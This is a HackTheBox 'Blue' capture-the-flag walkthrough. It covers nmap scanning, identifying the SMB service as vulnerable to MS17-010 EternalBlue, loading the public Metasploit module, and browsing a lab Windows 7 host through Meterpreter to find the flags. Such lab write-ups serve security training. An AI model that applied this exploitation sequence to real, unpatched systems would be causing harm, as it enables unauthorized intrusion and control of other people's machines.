# HackTheBox - Blue Walkthrough 6/30/2025

---

## 1. First port scan to see what ports are open
 ```bash
nmap T4 -F 10.129.201.18 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 22:36 EDT
Failed to resolve "T4".
Nmap scan report for 10.129.201.18
Host is up (0.092s latency).
Not shown: 91 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

## 2. Second scan to see what services are running on the open ports

```bash
nmap -sC -sV -p135,139,445 10.129.201.18
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 22:38 EDT
Nmap scan report for 10.129.201.18
Host is up (0.063s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-01T02:39:03
|_  start_date: 2025-07-01T02:33:47
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-01T03:39:07+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.00 seconds
```
#### Take note of the service running on port 445

---

## 3. Exploiting the service running on port 445

After doing some research, I found that the service running on port 445 is vulnerbale to "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption."

#### Loading up metasploit

```bash
msfconsole
Metasploit tip: To save all commands executed since start up to a file, use the 
makerc command
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

---

#### Searching for the exploit

```bash
msf6 > search type:exploit ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   20    \_ target: Execute payload (x64)             .                .        .      .
   21    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 21, use 21 or use exploit/windows/smb/smb_doublepulsar_rce                                    
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'                                                      

msf6 > info 0

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  thelightcosine
  wvu <wvu@metasploit.com>
  agalway-r7
  cdelafuente-r7
  cdelafuente-r7
  agalway-r7

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic Target
      1   Windows 7
      2   Windows Embedded Standard 7
      3   Windows Server 2008 R2
      4   Windows 8
      5   Windows 8.1
      6   Windows Server 2012
      7   Windows 10 Pro
      8   Windows 10 Enterprise Evaluation

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS                          yes       The target host(s), see https:
                                            //docs.metasploit.com/docs/usi
                                            ng-metasploit/basics/using-met
                                            asploit.html
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain
                                            to use for authentication. Onl
                                            y affects Windows Server 2008
                                            R2, Windows 7, Windows Embedde
                                            d Standard 7 target machines.
  SMBPass                         no        (Optional) The password for th
                                            e specified username
  SMBUser                         no        (Optional) The username to aut
                                            henticate as
  VERIFY_ARCH    true             yes       Check if remote architecture m
                                            atches exploit Target. Only af
                                            fects Windows Server 2008 R2,
                                            Windows 7, Windows Embedded St
                                            andard 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches exp
                                            loit Target. Only affects Wind
                                            ows Server 2008 R2, Windows 7,
                                             Windows Embedded Standard 7 t
                                            arget machines.

```

Set the following options:

- LHOST to your host IP.
- RHOST to the target IP address.
---

## 4. Post Exploitation

After setting my options and running the exploit I gained a shell

```bash
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows


meterpreter > pwd
C:\Windows\system32

navigate to C: drive

meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2017-07-21 02:56:27 -0400  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2022-02-18 10:11:31 -0500  Config.Msi
040777/rwxrwxrwx  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096   dir   2022-02-18 10:02:50 -0500  Program Files
040555/r-xr-xr-x  4096   dir   2017-07-14 12:58:41 -0400  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2017-12-23 21:23:01 -0500  ProgramData
040777/rwxrwxrwx  0      dir   2022-02-18 09:09:14 -0500  Recovery
040777/rwxrwxrwx  0      dir   2017-07-14 09:48:44 -0400  Share
040777/rwxrwxrwx  4096   dir   2025-06-30 23:37:46 -0400  System Volume Information
040555/r-xr-xr-x  4096   dir   2017-07-21 02:56:23 -0400  Users
040777/rwxrwxrwx  16384  dir   2025-06-30 23:17:40 -0400  Windows
000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cd Users
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2017-07-21 02:56:36 -0400  Administrator
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:07:31 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:56 -0400  Default User
040555/r-xr-xr-x  4096  dir   2011-04-12 03:51:29 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2017-07-14 09:45:53 -0400  haris
```

---

## User and Root Flag Locations

#### User Flag 

```bash
meterpreter > cd haris
meterpreter > ls
Listing: C:\Users\haris
=======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  AppData
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Application Data
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Contacts
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Cookies
040555/r-xr-xr-x  0       dir   2017-12-23 21:23:23 -0500  Desktop
040555/r-xr-xr-x  4096    dir   2017-07-15 03:58:33 -0400  Documents
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Downloads
040555/r-xr-xr-x  4096    dir   2017-07-15 03:58:33 -0400  Favorites
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Links
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Music
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2021-01-15 04:41:00 -0500  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2017-07-14 10:03:15 -0400  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288  fil   2017-07-14 10:03:15 -0400  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2017-07-14 10:03:15 -0400  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  NetHood
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:32 -0400  Pictures
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  PrintHood
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Saved Games
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:33 -0400  Searches
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  SendTo
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-07-14 09:45:37 -0400  Templates
040555/r-xr-xr-x  0       dir   2017-07-15 03:58:32 -0400  Videos
100666/rw-rw-rw-  262144  fil   2025-06-30 23:38:14 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2017-07-14 09:45:36 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2017-07-14 09:45:37 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-15 03:58:32 -0400  desktop.ini
100444/r--r--r--  34    fil   2025-06-30 23:13:59 -0400  user.txt
```

---

#### Root Flag

```bash
meterpreter > cd Administrator
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 02:56:40 -0400  desktop.ini
100444/r--r--r--  34    fil   2025-06-30 23:14:00 -0400  root.txt
```

---

## References
- https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/

---

## Tools

- Nmap
- Metasploit

